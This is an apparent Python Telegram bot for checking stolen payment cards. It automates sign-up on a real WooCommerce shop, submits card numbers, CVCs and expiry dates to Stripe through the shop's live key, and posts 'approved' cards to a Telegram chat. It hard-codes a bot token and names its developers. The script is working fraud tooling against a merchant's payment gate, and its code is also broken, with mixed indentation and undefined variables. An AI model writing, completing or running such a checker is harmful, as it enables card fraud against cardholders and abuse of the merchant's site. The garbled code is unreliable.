import requests
import re
import time
import random
import re,json
import string
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet
import os
import webbrowser
from colorama import Fore
from getuseragent import UserAgent


D = '\033[2;32m'
E = '\033[2;31m'
E = '\033[2;33m'
E = '\033[2;34m'
R = '\033[2;31m'
B = '\033[2;35m'
Lb = '\033[1;33m'
W =  '\033[1;37m'
import requests
import os
import time
import sys
import webbrowser
from datetime import datetime
import telebot
import requests
import time

API_TOKEN = '7295999895:AAGo58OjcmoZhCoeQ74t17U4q5HxyTyN15E'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please use the /sd command followed by your card details.")

@bot.message_handler(commands=['sd'])
def handle_card(message):
    card = message.text[4:].strip()
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'ASDzxc#123#',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://purpleprofessionalitalia.it/my-account/',
	    'wc_order_attribution_session_start_time': '2024-10-17 14:07:30',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Registrati',
	}
	
	response = r.post('https://purpleprofessionalitalia.it/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'user-agent': user,
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=iegeodftomeppqjdgk%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
	msg=response.text
	if 'success' in msg:
	    print(Fore.GREEN+f" CC : {ccx} \n Response : Approved ✅ \n Dev @FNxOwner 💥💣")
	    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&parse_mode=HTML&text=<b>APPROVED  ✅\n \n⌧ CC : <code>{ccx}</code>\n[↯] GATES : Stripe Auth\n⌧ Response : Success 🟢\n \n⌧ CHK BY⇾ <a href='tg://user?id=6558098741'>ElectraOp</a></b>")

    	
	else:
		print(Fore.RED+f" CC : {ccx} \n Response : Your Card Was Declined. ❌ \n Dev : @FNxOwner 💥💣 ")